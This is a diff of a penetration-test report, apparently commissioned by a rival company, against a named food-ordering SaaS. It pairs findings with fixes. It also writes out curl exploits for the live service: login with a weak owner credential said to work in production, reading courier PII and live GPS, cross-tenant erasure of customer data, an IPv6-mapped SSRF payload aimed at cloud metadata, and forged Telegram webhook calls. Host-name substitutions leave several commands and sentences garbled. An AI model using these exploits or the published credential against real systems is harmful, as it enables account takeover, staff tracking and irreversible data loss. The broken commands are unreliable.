@@ -3,7 +3,7 @@
 - **Date**: 2026-07-13
 - **Engagement**: External black/grey-box pentest of dowiz (food-ordering SaaS), rival-commissioned.
 - **Scope**: Legacy TS stack API + web. OWASP Top 10 focus: broken access control / IDOR, authN, injection, SSRF, secrets, business logic, webhooks/CORS/CSRF.
-- **Targets**: Source `/root/dowiz` branch `feat/decentralized-pq-protocol`; live `https://dowiz.fly.dev` (prod) and `https://dowiz-staging.fly.dev` (staging), read-only / non-destructive probing only.
+- **Targets**: Source `/root/dowiz` branch `feat/decentralized-pq-protocol`; live legacy host (prod) and the legacy host (staging), read-only / non-destructive probing only.
 
 > **Source-of-truth note.** On this branch the legacy API has been moved to `attic/apps-api/src` (a verbatim retirement-move of the deployed `apps/api`). All `file:line` cites are against `attic/apps-api/src/**`. Findings were cross-checked against the live deployments. One divergence was observed: the live prod deploy has an extra `/api/admin/*` kill-switch (returns `503 admin_unavailable`) that is **not** present in the attic source — see Finding 8.
 
@@ -13,11 +13,11 @@
 
 **Yes — a rival can obtain an authenticated production owner session today, with zero effort, using publicly-documented credentials.** This is the worst case and it is **CONFIRMED live against prod**:
 
-`POST https://dowiz.fly.dev/api/auth/local/login` with `test@dowiz.com` / `test123456` (a "test owner fixture" documented in the repo's own `CLAUDE.md`/memory) returns a **production-key-signed** (`kid:"2"`) owner JWT for a real location, and that token is **accepted** by protected owner endpoints (`GET /api/owner/couriers` → `HTTP 200`). This is not a code bug in the login path — the login path is correct — it is a **seeded weak-credential account shipped into the production database with an active owner membership**.
+`POST `<legacy-host>/api/auth/local/login` with `test@dowiz.com` / `test123456` (a "test owner fixture" documented in the repo's own `CLAUDE.md`/memory) returns a **production-key-signed** (`kid:"2"`) owner JWT for a real location, and that token is **accepted** by protected owner endpoints (`GET /api/owner/couriers` → `HTTP 200`). This is not a code bug in the login path — the login path is correct — it is a **seeded weak-credential account shipped into the production database with an active owner membership**.
 
 From that foothold the attacker chains to:
 - **Cross-role staff-PII / live-GPS leak** (Finding 2) — reachable even by a *customer* token, no owner account needed.
-- **Server-Side Request Forgery into the Fly private network / cloud metadata** (Finding 4), reachable by any owner token including the backdoor account.
+- **Server-Side Request Forgery into the legacy host private network / cloud metadata** (Finding 4), reachable by any owner token including the backdoor account.
 - **Cross-tenant customer-PII erasure** (Finding 3) — irreversible destruction of another venue's customer data.
 
 **Mitigating the blast radius:** the platform's deeper defenses are genuinely strong and blocked several attacks — price is server-authoritative (no price/coupon/negative-qty manipulation), all SQL is parameterized (no injection found), input schemas are `.strict()` (no mass assignment), JWTs are RS256-only with no algorithm-confusion, the dev-login bypass fails closed on prod, and most owner routes are correctly tenant-scoped with `FORCE` RLS as a backstop. The problems are concentrated in (a) a shipped weak credential, (b) a handful of routes missing a role gate or an ownership re-check, and (c) an SSRF filter with an IPv6 gap.
@@ -30,11 +30,11 @@ From that foothold the attacker chains to:
 
 ### F1 — CRITICAL · Seeded weak owner credential live in production (`test@dowiz.com` / `test123456`)
 - **Severity**: **Critical — CONFIRMED (live, prod)**
-- **Location**: Live `POST https://dowiz.fly.dev/api/auth/local/login`; login handler `attic/apps-api/src/routes/auth/local.ts:85-146` (Path 2, real argon2). Credential documented in `.claude/CLAUDE.md` / project memory ("Test owner fixture test@dowiz.com/test123456").
+- **Location**: Live `POST `<legacy-host>/api/auth/local/login` login handler `attic/apps-api/src/routes/auth/local.ts:85-146` (Path 2, real argon2). Credential documented in `.claude/CLAUDE.md` / project memory ("Test owner fixture test@dowiz.com/test123456").
 - **Exploit** (verified, non-destructive):
   ```bash
   # 1. Anonymous login with public/documented creds → real prod owner token
-  curl -s -X POST https://dowiz.fly.dev/api/auth/local/login \
+  curl -s -X POST the legacy host/api/auth/local/login \
     -H 'content-type: application/json' \
     -d '{"email":"test@dowiz.com","password":"test123456"}'
   # → 200 {"access_token":"eyJhbGciOiJSUzI1NiIsImtpZCI6IjIifQ...."}
@@ -42,7 +42,7 @@ From that foothold the attacker chains to:
   #   payload {"role":"owner","userId":"00bf019a-...","activeLocationId":"3625d9b3-...","exp":...}
 
   # 2. Token is accepted by protected owner endpoints
-  curl -s -H "Authorization: Bearer <token>" https://dowiz.fly.dev/api/owner/couriers
+  curl -s -H "Authorization: Bearer <token>" the legacy host/api/owner/couriers
   # → HTTP 200  (confirmed authenticated owner session)
   ```
 - **Impact**: Full owner takeover of the associated production location: read/modify that venue's orders, menu, promotions, couriers, settlements, and customer contact PII (via the owner's own-order reveal path), plus it is the launch point for F2/F3/F4. Even if `3625d9b3-…` is a demo tenant, this proves the local-login path issues **production-key owner sessions for seeded accounts**, so any other seeded/weak owner account is equally exploitable, and the credential is public.
@@ -57,9 +57,9 @@ From that foothold the attacker chains to:
 - **Exploit**: A diner who has a customer token for venue X (minted on any order at X, `locationId=X`):
   ```bash
   curl -H "Authorization: Bearer <customer_token_for_X>" \
-       https://dowiz.fly.dev/api/owner/locations/<X>/couriers
+       the legacy host/api/owner/locations/<X>/couriers
   curl -H "Authorization: Bearer <customer_token_for_X>" \
-       https://dowiz.fly.dev/api/owner/locations/<X>/couriers/live   # live GPS
+       the legacy host/api/owner/locations/<X>/couriers/live   # live GPS
   ```
 - **Impact**: Any customer (or any courier) of a venue can enumerate that venue's entire delivery-staff roster (names, masked email/phone, ratings, delivery counts) and **track couriers' live GPS positions** in real time. Cross-role horizontal privilege escalation + staff-safety/PII exposure. RLS does **not** help here — the caller legitimately belongs to X; the missing control is the role gate.
 - **Fix**: Add `fastify.addHook('preValidation', requireRole(['owner']))` to the plugin (mirror `owner/dashboard.ts:15-17`). Longer term, factor a single shared owner-route hook bundle so no owner handler can register without the role gate.
@@ -73,7 +73,7 @@ From that foothold the attacker chains to:
 - **Why RLS does not save it (live, confirmed)**: The worker uses the operational pool with **no `withTenant`**, so `app.user_id` is unset and `app_current_user()` returns NULL (`core-identity.ts:70-72`: `NULLIF(current_setting('app.user_id',true),'')`). The `customers` table carries `anonymous_update`/`anonymous_select` policies `USING (app_current_user() IS NULL)` (`migrations/1780338981782_customer-anonymous-update.ts:6-11`). RLS policies are permissive/OR'd, so a NULL-context connection is **granted UPDATE/SELECT on every customer row cross-tenant** — this is exactly why the erasure worker functions at all, and it means the missing `location_id` filter is directly exploitable.
 - **Exploit**:
   ```bash
-  curl -X POST https://dowiz.fly.dev/api/owner/locations/<MY_LOC>/gdpr-requests \
+  curl -X POST the legacy host/api/owner/locations/<MY_LOC>/gdpr-requests \
     -H "Authorization: Bearer <owner_jwt>" -H 'content-type: application/json' \
     -d '{"customerId":"<a customers.id belonging to ANOTHER venue>"}'
   # → 201; the background worker irreversibly scrubs that foreign customer's phone+name.
@@ -89,12 +89,12 @@ From that foothold the attacker chains to:
 - **Root cause**: `isPrivateIp` handles IPv4 numerically but for IPv6 only string-matches `::1`, `fc*`, `fd*`, `fe80*`, `::` (`:156-157`). An IPv4-mapped IPv6 literal such as `::ffff:169.254.169.254` matches none of these → returns `false`. And because `net.isIP("::ffff:169.254.169.254") === 6`, `assertPublicUrl` (`:167`) skips DNS resolution and trusts the literal. `fetch("http://[::ffff:169.254.169.254]/")` then connects to the IPv4 metadata endpoint at the OS layer.
 - **Exploit**:
   ```bash
-  curl -X POST https://dowiz.fly.dev/api/owner/brand/generate \
+  curl -X POST the legacy host/api/owner/brand/generate \
     -H "Authorization: Bearer <owner_jwt>" -H 'content-type: application/json' \
     -d '{"website":"http://[::ffff:169.254.169.254]/latest/meta-data/"}'
   # also ::ffff:127.0.0.1, ::ffff:10.x, or an AAAA record → ::ffff:a9fe:a9fe
   ```
-- **Impact**: Any authenticated owner reaches the cloud metadata service and Fly 6PN internal hosts. Semi-blind: the extractor reflects parsed `name`/colours/`sources` from the internal response. Combined with F1, an anonymous attacker reaches the internal network.
+- **Impact**: Any authenticated owner reaches the cloud metadata service and legacy private network internal hosts. Semi-blind: the extractor reflects parsed `name`/colours/`sources` from the internal response. Combined with F1, an anonymous attacker reaches the internal network.
 - **Fix**: In `isPrivateIp`, unwrap the mapped form before classifying — `if (v.startsWith('::ffff:')) return isPrivateIp(v.slice(7));` — and reject any `net.isIP()===6` value that embeds an IPv4 literal. Ideally pin the resolved IP into the connection (undici dispatcher) to also close the documented DNS-rebind TOCTOU (`brand-extractor.ts:182-184`).
 
 ---
@@ -105,7 +105,7 @@ From that foothold the attacker chains to:
 - **Root cause**: (a) When the `x-telegram-bot-api-secret-token` header is **absent**, the request is processed anyway (`:57-60`, "process anyway for backward compat") — leaving only the URL path segment as the gate. (b) When present, the comparison is a plain `!==` (`:50`), not constant-time. (c) If `TELEGRAM_BOT_SECRET` is empty, `if (telegramBotSecret)` is falsy, the whole check is skipped and the route mounts at the predictable path `/webhook/telegram/` with **zero authentication**.
 - **Exploit** (path secret leaks readily via logs/proxy; or empty):
   ```bash
-  curl -X POST "https://dowiz.fly.dev/webhook/telegram/<BOT_SECRET_OR_EMPTY>" \
+  curl -X POST "the legacy host/webhook/telegram/<BOT_SECRET_OR_EMPTY>" \
     -H 'content-type: application/json' \
     -d '{"callback_query":{"id":"1","from":{"id":<OWNER_TG_ID>},"message":{"chat":{"id":<OWNER_TG_ID>},"message_id":1,"text":"x"},"data":"order.confirm:<ORDER_UUID>"}}'
   ```
